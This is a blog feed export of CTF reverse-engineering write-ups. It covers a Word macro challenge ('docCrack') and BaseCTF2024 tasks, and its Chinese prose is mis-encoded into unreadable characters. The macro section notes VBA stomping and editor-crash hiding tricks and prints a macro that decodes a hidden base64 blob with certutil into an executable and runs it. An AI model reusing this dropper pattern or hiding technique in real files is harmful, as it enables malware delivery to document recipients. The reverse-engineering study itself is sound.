æ­¤ä¿®å¤è¯¥æ–‡ä»¶éœ€è¦Moduleçš„ä¿¡æ¯é‡æ–°ç¼–è¾‘è¿›å»ï¼Œå…¶ä½™ä¿¡æ¯åç§»ã€‚</p><p>ä¿®å¤å®Œè„šæœ¬æ–‡ä»¶åï¼Œé‡æ–°å°†æ–‡æ¡£æ–‡ä»¶æ‰“åŒ…ï¼Œä¿®æ”¹åç¼€ï¼Œç„¶åæ‰“å¼€wordï¼Œç‚¹å‡»çš„ç¼–è¯‘å™¨ç¼–è¾‘æŒ‰é’®ï¼Œå‘ç°VBAè„šæœ¬ç¼–è¯‘å™¨å¯ä»¥æ­£å¸¸æ‰“å¼€ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>VBAç¼–è¯‘å™¨å´©æºƒæŠ€æœ¯ä¸stompingå’Œé‡å®šå‘æŠ€æœ¯æ²¡æœ‰å†²çªï¼Œä¸‰è€…å¯ä»¥ç›¸äº’ç»„åˆä½¿ç”¨ï¼Œäº’è¡¥æ¯ä¸ªæŠ€æœ¯ä¸­å­˜åœ¨çš„ç¼ºé™·ï¼Œ</p><h2 id="å›åˆ°è¿™ä¸ªé¢˜ç›®"><a href="#å›åˆ°è¿™ä¸ªé¢˜ç›®" class="headerlink" title="å›åˆ°è¿™ä¸ªé¢˜ç›®"></a>å›åˆ°è¿™ä¸ªé¢˜ç›®</h2><p>(å¯ç”¨å®â€”â€”)</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904001558987.png" alt="image-20240904001558987"></p><p>æ‹†å¼€åŒ…å‘ç°æ²¡æœ‰é‡å®šå‘ã€è¿è¡Œå®æ–‡ä»¶ä¹Ÿæ²¡æœ‰æŠ¥é”™ï¼Œç›´æ¥ç”¨ oletools åç¼–è¯‘ P-codeâ€”â€”</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -U oletools[full]</span><br><span class="line">olevba -c protected_secret.docm &gt; code.vbs</span><br></pre></td></tr></table></figure><p>ä»£ç å‡ºæ¥äº†</p><p>çœ‹çœ‹ä¸»è¦ä»£ç â€”â€”</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="built_in">Len</span>(inflag)</span><br><span class="line">            res = <span class="built_in">Chr</span>(<span class="built_in">Asc</span>(<span class="built_in">Mid</span>(inflag, i, <span class="number">1</span>)) <span class="keyword">Xor</span> <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">            Result = Result &amp; res</span><br><span class="line">        <span class="keyword">Next</span> i</span><br><span class="line"> xpkdb = dWPtWzWvKrZRFrsAWZMGNjZQbCrgAImKXVUkOykXWeRltpUU + AMaKeZzlhAtdNANKAKwMNbKEKUWuQVZQbbCJIUog + BvEKpalonhsRIgbPkYPYbsbQGzIzvPitapncgtGKIo + yBILPYnXCUApVHExOtpKlnfTkVfexwgrFQOFIveA + pqdgalQAZJKIDySPundFqdITahrgAYveJXfZCOUHWnUDKXZwZU + pErQJcjFIvYQeIehtTPMaOgEwFvvjnaTkabtJDvpHbWG + QmLHKhwBebnYaryyPsFeBassnVEjIoURcqNseXyjyMdcDfFnag</span><br><span class="line"></span><br><span class="line">tempPath = ThisDocument.Path &amp; <span class="string">&quot;\temp1&quot;</span></span><br><span class="line">        <span class="keyword">Set</span> tempfile = fso.CreateTextFile(tempPath, <span class="literal">True</span>)</span><br><span class="line">        fso.GetFile(tempPath).Attributes = <span class="number">2</span></span><br><span class="line">        tempfile.WriteLine xpkdb</span><br><span class="line">        tempfile.Close</span><br><span class="line">        </span><br><span class="line">        batPath = ThisDocument.Path &amp; <span class="string">&quot;\temp.bat&quot;</span></span><br><span class="line">        <span class="keyword">Set</span> batFile = fso.CreateTextFile(batPath, <span class="literal">True</span>)</span><br><span class="line">        fso.GetFile(batPath).Attributes = <span class="number">2</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;@echo off&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;cd /d &quot;</span> &amp; ThisDocument.Path</span><br><span class="line">        batFile.WriteLine <span class="string">&quot;certutil -decode temp1 temp|certutil -decode temp temp.exe&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;del temp&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;temp.exe &quot;</span> &amp; <span class="string">&quot;&quot;&quot;&quot;</span> &amp; Result &amp; <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;del temp.exe&quot;</span></span><br><span class="line">        batFile.Close</span><br><span class="line">        <span class="keyword">Set</span> objExec = objShell.Exec(batPath)</span><br><span class="line">        <span class="keyword">Set</span> objStdOut = objExec.StdOut</span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> <span class="keyword">Not</span> objStdOut.AtEndOfStream</span><br><span class="line">            output = <span class="built_in">Trim</span>(objStdOut.ReadLine)</span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">        output = <span class="built_in">Left</span>(output, <span class="built_in">Len</span>(output))</span><br><span class="line">        StartTime = Timer</span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> Timer &lt; StartTime + <span class="number">1</span></span><br><span class="line">            DoEvents</span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">        fso.DeleteFile batPath</span><br><span class="line">        fso.DeleteFile tempPath</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">If</span> output = <span class="string">&quot;good&quot;</span> <span class="keyword">Then</span></span><br><span class="line">            temp = <span class="built_in">MsgBox</span>(<span class="string">&quot;good!!!&quot;</span>, , <span class="string">&quot;congratulations!!!&quot;</span>)</span><br><span class="line">            <span class="keyword">Exit</span> <span class="keyword">Do</span></span><br><span class="line">        <span class="keyword">Else</span></span><br><span class="line">            temp = <span class="built_in">MsgBox</span>(<span class="string">&quot;Sorry, U are wrong!!!&quot;</span>, , <span class="string">&quot;Hacked_by_??????&quot;</span>)</span><br><span class="line">            isContinue = <span class="built_in">MsgBox</span>(<span class="string">&quot;Continue?&quot;</span>, vbYesNo + vbQuestion, <span class="string">&quot;Warning&quot;</span>)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Loop</span> <span class="keyword">While</span> isContinue = <span class="number">6</span></span><br></pre></td></tr></table></figure><p>flagæ¯ä½å¼‚æˆ–7</p><p>temp1ä¸ºä¸¤æ¬¡base64åŠ å¯†åçš„æ–‡ä»¶ï¼Œtemp.batä¸ºéªŒè¯åä¿å­˜ç»“æœçš„æ–‡ä»¶</p><p>æ–­ç‚¹ä¸‹äº†ï¼Œä½†æ˜¯è·‘ä¸èµ·æ¥ï¼Œç›´æ¥æŠ å‡ºæ¥â€”â€”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‰é¢çœç•¥äº†</span></span><br><span class="line">xpkdb = dWPtWzWvKrZRFrsAWZMGNjZQbCrgAImKXVUkOykXWeRltpUU + AMaKeZzlhAtdNANKAKwMNbKEKUWuQVZQbbCJIUog + BvEKpalonhsRIgbPkYPYbsbQGzIzvPitapncgtGKIo + yBILPYnXCUApVHExOtpKlnfTkVfexwgrFQOFIveA + pqdgalQAZJKIDySPundFqdITahrgAYveJXfZCOUHWnUDKXZwZU + pErQJcjFIvYQeIehtTPMaOgEwFvvjnaTkabtJDvpHbWG + QmLHKhwBebnYaryyPsFeBassnVEjIoURcqNseXyjyMdcDfFnag</span><br><span class="line"></span><br><span class="line">exe = <span class="string">&quot;123.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(exe, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(xpkdb)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014341602.png" alt="image-20240904014341602"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014522420.png" alt="image-20240904014522420"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014546252.png" alt="image-20240904014546252"></p><p>è§£ç â€”â€”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">v7 = [<span class="number">0</span>]*<span class="number">54</span></span><br><span class="line">v7[<span class="number">0</span>] = <span class="number">4288</span></span><br><span class="line">v7[<span class="number">1</span>] = <span class="number">4480</span></span><br><span class="line">v7[<span class="number">2</span>] = <span class="number">5376</span></span><br><span class="line">v7[<span class="number">3</span>] = <span class="number">4352</span></span><br><span class="line">v7[<span class="number">4</span>] = <span class="number">5312</span></span><br><span class="line">v7[<span class="number">5</span>] = <span class="number">4160</span></span><br><span class="line">v7[<span class="number">6</span>] = <span class="number">7936</span></span><br><span class="line">v7[<span class="number">7</span>] = <span class="number">5184</span></span><br><span class="line">v7[<span class="number">8</span>] = <span class="number">6464</span></span><br><span class="line">v7[<span class="number">9</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">10</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">11</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">12</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">13</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">14</span>] = <span class="number">6336</span></span><br><span class="line">v7[<span class="number">15</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">16</span>] = <span class="number">6720</span></span><br><span class="line">v7[<span class="number">17</span>] = <span class="number">6144</span></span><br><span class="line">v7[<span class="number">18</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span class="number">19</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">20</span>] = <span class="number">6656</span></span><br><span class="line">v7[<span class="number">21</span>] = <span class="number">7296</span></span><br><span class="line">v7[<span class="number">22</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">23</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">24</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">25</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">26</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">27</span>] = <span class="number">4416</span></span><br><span class="line">v7[<span class="number">28</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">29</span>] = <span class="number">7168</span></span><br><span class="line">v7[<span class="number">30</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">31</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">32</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span class="number">33</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">34</span>] = <span class="number">3520</span></span><br><span class="line">v7[<span class="number">35</span>] = <span class="number">6208</span></span><br><span class="line">v7[<span class="number">36</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">37</span>] = <span class="number">4736</span></span><br><span class="line">v7[<span class="number">38</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">39</span>] = <span class="number">6400</span></span><br><span class="line">v7[<span class="number">40</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">41</span>] = <span class="number">3520</span></span><br><span class="line">v7[<span class="number">42</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">43</span>] = <span class="number">5184</span></span><br><span class="line">v7[<span class="number">44</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">45</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">46</span>] = <span class="number">7296</span></span><br><span class="line">v7[<span class="number">47</span>] = <span class="number">3200</span></span><br><span class="line">v7[<span class="number">48</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span class="number">49</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">50</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">51</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">52</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">53</span>] = <span class="number">7808</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(v7[i] &gt;&gt; <span class="number">6</span> ^ <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DASCTF&#123;Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!&#125;</span></span><br><span class="line"><span class="comment">#ä¹ï¼Œå¦‚æœä¸å¼‚æˆ–7ï¼Œå¤´å…­ä¸ªæ˜¯CFTDSAï¼Œå¦™å–µ</span></span><br></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä¸€ç¬è§‰å¾—åšçš„é¢˜å¤ªå°‘äº†ï¼Œæ€ä¹ˆè¿™ä¸ªæ—¶å€™æ‰å‘ç°è¿™ä¹ˆå¥½ç©çš„é¢˜ç›®</p><p>å¦ä¸€ç¬è§‰å¾—ï¼Œç°åœ¨äº†è§£åˆ°çŸ¥é“å­¦åˆ°äº†ï¼Œä¹Ÿæ˜¯ä¸€ä»¶å¾ˆå¹¸ç¦çš„äº‹æƒ…â€”â€”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ğŸç¾ŠåŸæ¯2024-Reverse-docCrack&quot;&gt;&lt;a href=&quot;#ğŸç¾ŠåŸæ¯2024-Reverse-docCrack&quot; class=&quot;headerlink&quot; title=&quot;ğŸç¾ŠåŸæ¯2024 | Reverse_docCrack&quot;&gt;&lt;/a&gt;ğŸç¾ŠåŸæ¯2</summary>
      
    
    
    
    
    <category term="OJ" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/OJ/"/>
    
  </entry>
  
  <entry>
    <title>BaseCTF2024</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/08/24/BaseCTF2024_Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/08/24/BaseCTF2024_Reverse/</id>
    <published>2024-08-23T16:00:00.000Z</published>
    <updated>2024-09-16T07:56:07.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BaseCTF2024-Week1"><a href="#BaseCTF2024-Week1" class="headerlink" title="BaseCTF2024[Week1]"></a>BaseCTF2024[Week1]</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="You-are-good-at-IDA"><a href="#You-are-good-at-IDA" class="headerlink" title="You are good at IDA"></a>You are good at IDA</h3><h4 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h4><p>æ‰“å¼€IDAæŒ‰F5ï¼Œå¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135041482.png" alt="image-20240824135041482"></p><h4 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h4><p>æ ¹æ®ä»¥ä¸Šæç¤ºï¼Œshift+F2:</p><p>Secondå­—ç¬¦ç‚¹å‡»è¿›å…¥ï¼ŒæŒ‰â€œXâ€äº¤å‰å¼•å…¥æ‰¾åˆ°å¯¹åº”å‡½æ•°ï¼Œ</p><p>å¾—åˆ°ç¬¬äºŒéƒ¨åˆ†flagï¼ŒæŒ‰â€œRâ€è½¬æ¢ä¸ºå­—ç¬¦ï¼š</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135517153.png" alt="image-20240824135517153"></p><h4 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h4><p>ç¬¬ä¸‰éƒ¨åˆ†flagåœ¨ä¸€ä¸ªInterestingçš„å‡½æ•°ä¸­ï¼š</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135453999.png" alt="image-20240824135453999"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135535863.png" alt="image-20240824135535863"></p><h4 id="flag"><a href="#flag" class="headerlink" title="flag:"></a>flag:</h4><p>BaseCTF{Y0u_4Re_900d_47_id4}</p><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>æ‹–DIEä¸­æŸ¥å£³å„¿ï¼Œ4.01ç‰ˆæœ¬</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824140522684.png" alt="image-20240824140522684"></p><p><code>upx -d  UPXmini.exe</code></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824143602786.png" alt="image-20240824143602786"></p><p>ç‚¹å‡»base64å‡½æ•°ï¼Œå‘ç°æ²¡æ¢è¡¨ï¼Œæœ‰å¯†æ–‡ï¼Œç›´æ¥å‡ºflag</p><p>é™„ä¸€ä¸ªæ ‡å‡†base64ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">base64_encode</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+74h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *Str; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  Str = a1;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v1 = v6 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">2</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(v11 + <span class="number">1</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; v6 - v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v9] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v9 + <span class="number">1</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * Str[v8]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v5[v9 + <span class="number">2</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * Str[v8 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v5[v9 + <span class="number">3</span>] = v4[Str[v8 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8 += <span class="number">3</span>;</span><br><span class="line">    v9 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v11 - <span class="number">4</span>] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">1</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v11 - <span class="number">3</span>] = v4[(<span class="number">16</span> * Str[v6 - <span class="number">1</span>]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v2 = &amp;v5[v11 - <span class="number">1</span>];</span><br><span class="line">    *v2 = <span class="number">61</span>;</span><br><span class="line">    v5[v11 - <span class="number">2</span>] = *v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v10 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v11 - <span class="number">4</span>] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">2</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v11 - <span class="number">3</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * Str[v6 - <span class="number">2</span>]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v5[v11 - <span class="number">2</span>] = v4[(<span class="number">4</span> * Str[v6 - <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v5[v11 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5[v11] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ez-Xor"><a href="#Ez-Xor" class="headerlink" title="Ez Xor"></a>Ez Xor</h3><p>æ— å£³</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824144240382.png" alt="image-20240824144240382"></p><p>çœ‹é€»è¾‘ï¼Œåˆ¤æ–­è¾“å…¥å­—ç¬¦ä¸º28ä½ï¼Œå¤„ç†v4(å‡è®¾ä¸ºå¯†é’¥â€Xorâ€)ï¼ŒåŠ å¯†è¾“å…¥å­—ç¬¦ï¼Œä¸å¯†æ–‡æ¯”è¾ƒâ€”â€”</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824144219198.png" alt="image-20240824144219198"></p><p>Set item type æ”¹æ•°æ®ç±»å‹</p><p>å¼‚æˆ–ä¸²1ç”±iå¼‚æˆ–keyå¾ªç¯äº§ç”Ÿ28ä½</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824154936713.png" alt="image-20240824154936713"></p><p>flagä¸ é€†è½¬çš„å¼‚æˆ–ä¸²1 å¼‚æˆ–äº§ç”Ÿå­—ç¬¦ä¸²Str</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824193746260.png" alt="image-20240824193746260"></p><p>æœ€åSträ¸ç»™çš„å¯†æ–‡æ¯”è¾ƒ</p><p>é€»è¾‘ä¹Ÿç®€å•ï¼Œå†™è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x58</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>] <span class="comment">#Xorè½¬16è¿›åˆ¶</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">box = []</span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line">Str = [</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x2D</span>, <span class="number">0x0B</span>, <span class="number">0x1D</span>, </span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x7A</span>, <span class="number">0x31</span>, <span class="number">0x20</span>, <span class="number">0x1E</span>, <span class="number">0x49</span>, <span class="number">0x3D</span>, <span class="number">0x67</span>, </span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x08</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x6E</span>, <span class="number">0x05</span>, <span class="number">0x34</span>, </span><br><span class="line">    <span class="number">0x22</span>, 